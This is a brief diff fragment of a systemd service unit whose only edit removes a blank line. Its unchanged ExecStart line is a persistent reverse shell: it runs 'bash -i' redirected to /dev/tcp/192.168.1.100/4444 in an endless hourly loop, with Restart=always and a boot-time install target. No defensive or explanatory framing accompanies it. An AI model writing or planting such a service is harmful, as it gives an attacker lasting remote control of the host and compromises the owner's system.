@@ -8,7 +8,6 @@ After=network.target
 [Service]
 ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sleep 3600; done'
 Restart=always
-
 [Install]
 WantedBy=multi-user.target
 EOF
